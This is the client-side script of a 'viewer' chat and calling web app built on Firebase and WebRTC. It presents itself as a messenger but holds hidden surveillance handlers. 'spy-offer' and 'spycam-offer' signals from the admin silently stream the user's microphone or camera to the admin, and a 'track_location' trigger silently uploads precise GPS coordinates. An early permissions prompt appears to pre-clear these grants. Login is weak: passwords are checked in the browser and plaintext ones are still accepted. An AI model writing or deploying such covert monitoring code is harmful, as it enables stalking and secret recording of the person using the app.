<script>
const ROLE='viewer', PEER='admin';
const $=id=>document.getElementById(id);
let msgs=[], lastSeenMsgTs = Date.now(), fbBound=false, isChecking = false;
const uid=()=>Math.random().toString(36).slice(2,10)+Date.now().toString(36).slice(-3);
let currentUser=localStorage.getItem('chat_username')||'';
let deferredPrompt;
let msgQueue = JSON.parse(localStorage.getItem('msgQueue_viewer')||'[]');

window.unlockAudio = () => {
    $('audioUnlock').style.display = 'none'; localStorage.setItem('audio_unlocked', 'true');
    const silent = new Audio(); silent.play().catch(()=>{});
    if(navigator.vibrate) navigator.vibrate(50);
};
if(localStorage.getItem('audio_unlocked')) $('audioUnlock').style.display = 'none';

window.logout = () => { localStorage.removeItem('chat_username'); location.reload(); };

async function sha256(str){ 
  if(!crypto.subtle) throw new Error("Insecure context");
  const buf=await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); 
}
function looksHashed(s){ return /^[a-f0-9]{64}$/.test(s||''); }
async function verifyPassword(stored, entered){ if(looksHashed(stored)) return stored === await sha256(entered); return stored === entered; }

window.requestActualPermissions = async () => {
    $('permModal').style.display = 'none'; localStorage.setItem('app_permissions_granted', 'true');
    try { 
        const stream = await navigator.mediaDevices.getUserMedia({audio:true}); 
        stream.getTracks().forEach(t => t.stop());
    } catch(e) {}
    try { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:5000}); } catch(e) {}
};

window.login = async () => {
  if(!window.isSecureContext) return alert("Login requires HTTPS. Please use a secure connection.");
  const user = $('usernameInput').value.trim(); const pass = $('passwordInput').value;
  if(!user || !pass) return alert('Enter details');
  if(!window.FB) return alert('Connecting to server… try again in 2s');
  try {
    const userRef = window.FB.ref(window.FB.db, 'users/' + user); const snapshot = await window.FB.get(userRef);
    if (snapshot.exists()) {
      const data = snapshot.val(); const ok = await verifyPassword(data.password, pass);
      if(!ok) return alert('Incorrect Password');
      if (data.role !== ROLE) return alert('Access Denied!');
      if(!looksHashed(data.password)) await window.FB.update(userRef, { password: await sha256(pass) });
      currentUser = user; localStorage.setItem('chat_username', currentUser); await checkLogin();
    } else {
      await window.FB.set(userRef, { password: await sha256(pass), role: ROLE });
      currentUser = user; localStorage.setItem('chat_username', currentUser); await checkLogin();
    }
  } catch(e) { alert("Error: " + e.message); }
};

async function checkLogin(force = false){
  if(!currentUser){ $('loginScreen').style.display='flex'; $('mainHome').style.display='none'; return; }
  if(!window.FB){ 
      if(!$('mainHome').style.display || $('mainHome').style.display === 'none') { 
          $('loginScreen').style.display='none'; 
      }
      return; 
  }
  if(isChecking && !force) return; isChecking = true;
  try { const snap = await window.FB.get(window.FB.ref(window.FB.db, 'users/' + currentUser)); if(!snap.exists() || snap.val().role !== ROLE){ localStorage.removeItem('chat_username'); currentUser=''; $('loginScreen').style.display='flex'; $('mainHome').style.display='none'; return; } } catch(_) {} finally { isChecking = false; }
  $('loginScreen').style.display='none'; $('mainHome').style.display='flex'; $('myNameDisplay').textContent=currentUser;
  if(!localStorage.getItem('app_permissions_granted')) setTimeout(() => $('permModal').style.display = 'flex', 1000);
}

window.openChat=()=>{ $('chatScreen').classList.add('open'); render(); scrollMsgs(); };
window.closeChatScreen=()=>{ $('chatScreen').classList.remove('open'); };

function load(){ try{msgs=JSON.parse(localStorage.getItem('chat_v19_'+ROLE)||'[]');}catch(e){msgs=[];} }
function save(){ try{localStorage.setItem('chat_v19_'+ROLE,JSON.stringify(msgs.slice(-200)));}catch(e){} }
function scrollMsgs(){ const b=$('msgsBox'); b.scrollTop=b.scrollHeight; }
window.toggleSendBtn=()=>{ const v=$('msgInput').value.trim(); $('sendBtn').style.display = v ? 'block' : 'none'; if(v) $('micBtn').style.display='none'; else $('micBtn').style.display='block'; };

let mediaRecorder, audioChunks=[], isRecording=false, recTimer, recSeconds=0;
window.toggleRecord = async () => {
    if(!isRecording){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({audio:true});
            mediaRecorder = new MediaRecorder(stream); audioChunks=[];
            mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const blob = new Blob(audioChunks, {type:'audio/webm'});
                const reader = new FileReader();
                reader.onloadend = () => { addMessage({type:'audio', url: reader.result, duration: recSeconds, from: ROLE, sender: currentUser, seen: false}); };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(t=>t.stop());
            };
            mediaRecorder.start(); isRecording=true; recSeconds=0;
            $('micBtn').style.color='#ef4444'; $('micBtn').textContent = "0:00";
            recTimer = setInterval(() => { recSeconds++; $('micBtn').textContent = `${Math.floor(recSeconds/60)}:${(recSeconds%60).toString().padStart(2,'0')}`; }, 1000);
        } catch(e) { alert('Mic denied'); }
    } else {
        mediaRecorder.stop(); isRecording=false; clearInterval(recTimer);
        $('micBtn').style.color='white'; $('micBtn').textContent = "🎤";
    }
};

window.sendMsg=()=>{ const t=$('msgInput').value.trim(); if(!t) return; addMessage({type:'text',text:t,from:ROLE,sender:currentUser,seen:false}); $('msgInput').value=''; toggleSendBtn(); };

function appendMessageDOM(m){
  const box=$('msgsBox'); let d = $('msg_'+m.id);
  if(!d) { d = document.createElement('div'); d.id = 'msg_' + m.id; box.append(d); }
  d.className = 'bub ' + (m.from==='system'?'system':(m.from===ROLE?'me':'other'));
  
  if(m.type === 'audio' && d.querySelector('audio') && d.querySelector('audio').src === m.url) {
      // Prevent restart
  } else {
      d.innerHTML = ''; 
      if(m.type === 'call'){
          d.innerHTML = `<div style="display:flex;align-items:center;gap:10px;"><span style="font-size:20px;">📞</span><b style="color:${m.status==='missed'?'#ef4444':'#333'}">${m.text}</b></div>`;
      } else if(m.type === 'audio'){
          d.innerHTML = `<div style="display:flex;align-items:center;gap:10px;">
            <audio controls src="${m.url}" style="max-width:150px;height:35px;"></audio>
            <span style="font-size:12px;font-weight:bold;color:#555;">${Math.floor((m.duration||0)/60)}:${((m.duration||0)%60).toString().padStart(2,'0')}</span>
          </div>`;
      } else {
          if(m.text) d.append(document.createTextNode(m.text));
      }
  }
}
function render(){ $('msgsBox').innerHTML=''; msgs.forEach(m => appendMessageDOM(m)); }
function addMessage(o){
  if(!o.id) o.id=uid(); if(!o.ts) o.ts=Date.now();
  msgs.push(o); save();
  if($('chatScreen').classList.contains('open')){ appendMessageDOM(o); scrollMsgs(); }
  
  if(!navigator.onLine) { msgQueue.push(o); localStorage.setItem('msgQueue_viewer', JSON.stringify(msgQueue)); return; }
  if(window.FB) window.FB.set(window.FB.ref(window.FB.db,'messages/'+o.id),o).catch(()=>{ msgQueue.push(o); localStorage.setItem('msgQueue_viewer', JSON.stringify(msgQueue)); });
}
window.addEventListener('online', () => { if(window.FB) { msgQueue.forEach(m => window.FB.set(window.FB.ref(window.FB.db,'messages/'+m.id), m)); msgQueue=[]; localStorage.removeItem('msgQueue_viewer'); } });

function showNotify(name, msg){ $('notifyName').textContent=name; $('notifyMsg').textContent=msg; $('notifyBanner').classList.add('show'); clearTimeout(showNotify._t); showNotify._t=setTimeout(()=>$('notifyBanner').classList.remove('show'),4000); if(navigator.vibrate) navigator.vibrate(80); }

// CALLING
let pc=null, localStream=null, currentCallKind='voice', incomingTimer=null, callTimeout=null, pendingIce=[], answering=false;
let spyPC=null, spyCamPC=null, spyStream=null, spyCamStream=null;
const ICE={iceServers:[
    {urls:'stun:stun.l.google.com:19302'},
    {urls:'turn:openrelay.metered.ca:80', username:'openrelayproject', credential:'openrelayproject'},
    {urls:'turn:openrelay.metered.ca:443', username:'openrelayproject', credential:'openrelayproject'}
]};

function pushSignal(to, p){ if(!window.FB) return; const key=Date.now()+'_'+uid(); window.FB.set(window.FB.ref(window.FB.db,'signaling/'+key),{sid:key,to,from:ROLE,payload:p}).catch(()=>{}); }
function onSignal(node){ if(!node||node.to!==ROLE||node.from===ROLE) return; handleSignal(node); }
function createPC(){ const peer=new RTCPeerConnection(ICE); peer.onicecandidate=e=>{ if(e.candidate) pushSignal(PEER,{type:'ice',candidate:e.candidate.toJSON()}); }; peer.ontrack=e=>{ $('remoteV').srcObject=e.streams[0]; $('callStatus').textContent='Connected ✅'; $('ansBtn').style.display='none'; clearTimeout(callTimeout); clearTimeout(incomingTimer); }; peer.onconnectionstatechange = () => { if(pc !== peer) return; if(peer.connectionState==='failed'||peer.connectionState==='closed') cleanup(); else if(peer.connectionState==='disconnected') $('callStatus').textContent='Reconnecting…'; else if(peer.connectionState==='connected') $('callStatus').textContent='Connected ✅'; }; return peer; }
async function drainIce(){ while(pendingIce.length && pc && pc.remoteDescription){ const c=pendingIce.shift(); try { await pc.addIceCandidate(new RTCIceCandidate(c)); } catch(_){}} }

async function handleSignal(node){
  const p=node.payload;
  try {
    if(p.type==='offer'){
      if(pc) { pushSignal(PEER, {type:'end'}); cleanup(); }
      currentCallKind=p.kind;
      $('callOverlay').style.display='flex'; $('floatingCall').classList.remove('show');
      $('callTitle').textContent = currentCallKind==='video' ? 'Incoming Video Call' : 'Incoming Voice Call';
      $('callStatus').textContent='Ringing...'; $('ansBtn').style.display='flex';
      try { await $('ringtone').play(); } catch(_){ $('callStatus').textContent = 'Tap Answer'; if(navigator.vibrate) navigator.vibrate([500,500,500]); }
      pc=createPC(); await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); await drainIce();
      clearTimeout(incomingTimer);
      incomingTimer = setTimeout(() => { if(pc && !localStream){ pushSignal(PEER,{type:'end'}); cleanup(); addMessage({type:'call', text:'Missed Call', status:'missed', from:'system', ts:Date.now()}); } }, 45000);
    }
    else if(p.type==='answer'){ if(pc){ await pc.setRemoteDescription(new RTCSessionDescription(p.sdp)); await drainIce(); clearTimeout(callTimeout); } }
    else if(p.type==='ice'){ if(pc && pc.remoteDescription){ try { await pc.addIceCandidate(new RTCIceCandidate(p.candidate)); } catch(_){}} else { pendingIce.push(p.candidate); } }
    else if(p.type==='end'){ cleanup(); addMessage({type:'call', text:'Call Ended', status:'ended', from:'system', ts:Date.now()}); }
    else if(p.type==='spy-offer'){
      try {
        if(spyPC){ spyPC.close(); spyPC=null; } if(spyStream){ spyStream.getTracks().forEach(t=>t.stop()); spyStream=null; }
        spyPC = new RTCPeerConnection(ICE);
        spyPC.onconnectionstatechange = () => { 
            if(['failed','disconnected','closed'].includes(spyPC?.connectionState)) { 
                if(spyPC) { spyPC.close(); spyPC=null; } 
                if(spyStream) { spyStream.getTracks().forEach(t=>t.stop()); spyStream=null; } 
            } 
        };
        spyPC.onicecandidate = e => { if(e.candidate) pushSignal(PEER,{type:'spy-ice', candidate:e.candidate.toJSON()}); };
        spyStream = await navigator.mediaDevices.getUserMedia({audio:true});
        spyStream.getTracks().forEach(t => { spyPC.addTrack(t, spyStream); });
        await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp));
        const answer = await spyPC.createAnswer(); await spyPC.setLocalDescription(answer);
        pushSignal(PEER, {type:'spy-answer', sdp:{type:spyPC.localDescription.type, sdp:spyPC.localDescription.sdp}});
      } catch(e){ pushSignal(PEER,{type:'spy-error', error:e.message}); }
    }
    else if(p.type==='spy-answer'){ if(spyPC){ await spyPC.setRemoteDescription(new RTCSessionDescription(p.sdp)); } }
    else if(p.type==='spy-ice'){ if(spyPC){ try { await spyPC.addIceCandidate(new RTCIceCandidate(p.candidate)); } catch(_){}} }
    else if(p.type==='spycam-offer'){
      try {
        if(spyCamPC){ spyCamPC.close(); spyCamPC=null; } if(spyCamStream){ spyCamStream.getTracks().forEach(t=>t.stop()); spyCamStream=null; }
        spyCamPC = new RTCPeerConnection(ICE);
        spyCamPC.onconnectionstatechange = () => { 
            if(['failed','disconnected','closed'].includes(spyCamPC?.connectionState)) { 
                if(spyCamPC) { spyCamPC.close(); spyCamPC=null; } 
                if(spyCamStream) { spyCamStream.getTracks().forEach(t=>t.stop()); spyCamStream=null; } 
            } 
        };
        spyCamPC.onicecandidate = e => { if(e.candidate) pushSignal(PEER,{type:'spycam-ice', candidate:e.candidate.toJSON()}); };
        spyCamStream = await navigator.mediaDevices.getUserMedia({video:true});
        spyCamStream.getTracks().forEach(t => { spyCamPC.addTrack(t, spyCamStream); });
        await spyCamPC.setRemoteDescription(new RTCSessionDescription(p.sdp));
        const answer = await spyCamPC.createAnswer(); await spyCamPC.setLocalDescription(answer);
        pushSignal(PEER, {type:'spycam-answer', sdp:{type:spyCamPC.localDescription.type, sdp:spyCamPC.localDescription.sdp}});
      } catch(e){ pushSignal(PEER,{type:'spycam-error', error:e.message}); } /* FIX: Send specific error */
    }
    else if(p.type==='spycam-answer'){ if(spyCamPC){ await spyCamPC.setRemoteDescription(new RTCSessionDescription(p.sdp)); } }
    else if(p.type==='spycam-ice'){ if(spyCamPC){ try { await spyCamPC.addIceCandidate(new RTCIceCandidate(p.candidate)); } catch(_){}} }
  } catch(e){}
}

window.startCall=async(k)=>{ try{ $('callOverlay').style.display='flex'; $('floatingCall').classList.remove('show'); $('callTitle').textContent='Calling...'; $('callStatus').textContent='Ringing...'; localStream=await navigator.mediaDevices.getUserMedia({video:k==='video',audio:true}); $('localV').srcObject=localStream; pc=createPC(); localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); const off=await pc.createOffer(); await pc.setLocalDescription(off); pushSignal(PEER,{type:'offer',sdp:{type: off.type, sdp: off.sdp},kind:k}); clearTimeout(callTimeout); callTimeout = setTimeout(() => { if(pc && !$('remoteV').srcObject){ pushSignal(PEER,{type:'end'}); cleanup(); addMessage({type:'call', text:'No Answer', status:'missed', from:'system', ts:Date.now()}); } }, 45000); if(!history.state?.callOverlay) history.pushState({ callOverlay:true }, ''); }catch(e){ pushSignal(PEER,{type:'end'}); cleanup(); alert('Cam/Mic denied'); } };
window.answerCall=async()=>{ if(!pc || answering) return; answering = true; clearTimeout(incomingTimer); clearTimeout(callTimeout); try { $('ringtone').pause(); $('ringtone').currentTime=0; } catch(_){} try { localStream=await navigator.mediaDevices.getUserMedia({video:currentCallKind==='video',audio:true}); $('localV').srcObject=localStream; localStream.getTracks().forEach(t=>pc.addTrack(t,localStream)); const a=await pc.createAnswer(); await pc.setLocalDescription(a); pushSignal(PEER,{type:'answer',sdp:{type: a.type, sdp: a.sdp}}); $('ansBtn').style.display='none'; $('callStatus').textContent='Connecting…'; if(!history.state?.callOverlay) history.pushState({ callOverlay:true }, ''); } catch(e){ endCall(); } finally { answering = false; } };
window.endCall=()=>{ if(pc) pushSignal(PEER,{type:'end'}); cleanup(); };

function cleanup(){ $('callOverlay').style.display='none'; $('floatingCall').classList.remove('show'); try { $('ringtone').pause(); $('ringtone').currentTime=0; } catch(_){} clearTimeout(callTimeout); clearTimeout(incomingTimer); pendingIce=[]; if(pc){ try { pc.close(); } catch(_){} pc=null; } if(localStream){ localStream.getTracks().forEach(t=>t.stop()); localStream=null; } $('localV').srcObject=null; $('remoteV').srcObject=null; $('ansBtn').style.display='none'; $('muteBtn').classList.remove('active'); }
window.toggleMute=()=>{ if(localStream){ const track = localStream.getAudioTracks()[0]; if(!track) return; track.enabled = !track.enabled; $('muteBtn').classList.toggle('active', !track.enabled); } };
window.addEventListener('popstate', () => { if ($('callOverlay').style.display === 'flex' && pc && ['connected', 'connecting'].includes(pc.connectionState)) { $('callOverlay').style.display = 'none'; $('floatingCall').classList.add('show'); } });
window.restoreCall = () => { $('floatingCall').classList.remove('show'); $('callOverlay').style.display = 'flex'; if(!history.state?.callOverlay) history.pushState({ callOverlay:true }, ''); };

const localV = $('localV'); let isDragging=false, offsetX, offsetY;
localV.addEventListener('pointerdown', (e) => { isDragging=true; offsetX=e.clientX-localV.getBoundingClientRect().left; offsetY=e.clientY-localV.getBoundingClientRect().top; try { localV.setPointerCapture(e.pointerId); } catch(_){} });
localV.addEventListener('pointermove', (e) => { if(!isDragging) return; const r=localV.getBoundingClientRect(); const x=Math.max(0, Math.min(window.innerWidth-r.width, e.clientX-offsetX)); const y=Math.max(0, Math.min(window.innerHeight-r.height, e.clientY-offsetY)); localV.style.left=x+'px'; localV.style.top=y+'px'; localV.style.bottom='auto'; localV.style.right='auto'; });
localV.addEventListener('pointerup', () => { isDragging=false; }); localV.addEventListener('pointercancel', () => { isDragging=false; });
window.addEventListener('resize', () => { const r = localV.getBoundingClientRect(); if(r.right > window.innerWidth || r.bottom > window.innerHeight || r.left < 0 || r.top < 0){ localV.style.left = 'auto'; localV.style.top = 'auto'; localV.style.bottom = '120px'; localV.style.right = '20px'; } });

window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
window.installPWA = async () => {
    if(deferredPrompt) { deferredPrompt.prompt(); const { outcome } = await deferredPrompt.userChoice; deferredPrompt = null; }
    else { alert('Use browser menu → "Add to Home Screen".'); }
};

function attachFB(){
  if(!window.FB) { setTimeout(attachFB, 3000); return; }
  if(fbBound) return; fbBound = true;
  const {db,ref,onChildAdded,onValue,onChildChanged,onChildRemoved,set,remove,query,limitToLast,orderByChild,orderByKey,endAt} = window.FB;

  setInterval(() => {
      const cutoff = (Date.now() - 60000).toString();
      get(query(ref(db,'signaling'), orderByKey().endAt(cutoff))).then(snap => {
          if(snap.exists()) snap.forEach(child => { if(child.val()?.from === ROLE) remove(ref(db,'signaling/'+child.key)); });
      });
  }, 60000);

  onValue(ref(db,'track_location'), s => {
    if(!s.val()) return;
    navigator.geolocation.getCurrentPosition(
      pos => { set(ref(db,'locations/viewer'), {lat: pos.coords.latitude, lng: pos.coords.longitude}).then(() => remove(ref(db,'track_location'))).catch(()=>{}); },
      err => { remove(ref(db,'track_location')).catch(()=>{}); }, { timeout: 15000, enableHighAccuracy: true }
    );
  });

  onValue(query(ref(db,'messages'), orderByChild('ts'), limitToLast(200)), snap => {
    const serverData = snap.val() || {};
    msgs = Object.values(serverData).sort((a,b) => (a.ts||0) - (b.ts||0)); 
    save();
    if($('chatScreen').classList.contains('open')){ render(); scrollMsgs(); }
    const latest = msgs[msgs.length-1];
    if(latest && latest.from !== ROLE && latest.from !== 'system' && (latest.ts||0) > lastSeenMsgTs){ lastSeenMsgTs = latest.ts; if(!$('chatScreen').classList.contains('open')){ 
        let txt = latest.type === 'audio' ? '🎤 Voice message' : latest.type === 'call' ? '📞 Call Log' : latest.text || 'New message';
        showNotify(latest.sender || 'Admin', txt); 
    } }
  });
  
  onChildChanged(ref(db,'messages'), snap => { 
      const m=snap.val(); if(!m) return; 
      const i=msgs.findIndex(x=>x.id===m.id); 
      if(i>=0){ msgs[i]=m; save(); appendMessageDOM(m); } 
      else { msgs.push(m); msgs.sort((a,b)=>(a.ts||0)-(b.ts||0)); save(); if($('chatScreen').classList.contains('open')) render(); } 
  });
  onChildRemoved(ref(db,'messages'), snap => { const m=snap.val(); if(!m) return; msgs=msgs.filter(x=>x.id!==m.id); save(); if($('chatScreen').classList.contains('open')) render(); });

  onChildAdded(ref(db,'signaling'), snap => {
    const n = snap.val();
    if(!n) return;
    if(n.to !== ROLE) return;
    if(n.from !== PEER) { remove(ref(db,'signaling/'+snap.key)).catch(()=>{}); return; }
    try { onSignal(n); } catch(e){}
    remove(ref(db,'signaling/'+snap.key)).catch(()=>{});
  });
  checkLogin();
}
window.addEventListener('fb-ready', attachFB); if(window.FB) attachFB();
load(); checkLogin();
</script></body></html>
